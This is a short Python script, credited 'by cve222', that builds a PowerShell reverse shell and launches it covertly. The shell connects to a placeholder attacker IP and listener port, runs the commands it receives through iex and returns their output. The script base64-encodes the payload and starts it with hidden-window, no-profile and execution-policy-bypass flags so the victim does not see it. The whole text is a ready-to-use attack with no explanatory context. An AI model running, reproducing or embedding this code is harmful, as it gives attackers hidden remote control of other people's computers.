import subprocess
import base64
#                   by cve222
ps_command = """
$c=New-Object System.Net.Sockets.TCPClient('IP', LISTENER);
$s=$c.GetStream();
[byte[]]$b=0..65535|%{0};
while(($i=$s.Read($b,0,$b.Length))-ne0){
    $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
    $r=iex $d 2>&1|Out-String;
    $s.Write([text.encoding]::ASCII.GetBytes($r+'PS> '),0,$r.Length+4);
    $s.Flush()
};
$c.Close()
"""
ps_encoded = base64.b64encode(ps_command.encode('utf-16le')).decode()
subprocess.Popen(
    ["powershell", "-NoP", "-NonI", "-W", "Hidden", "-Exec", "Bypass", "-EncodedCommand", ps_encoded],
    creationflags=subprocess.CREATE_NO_WINDOW
)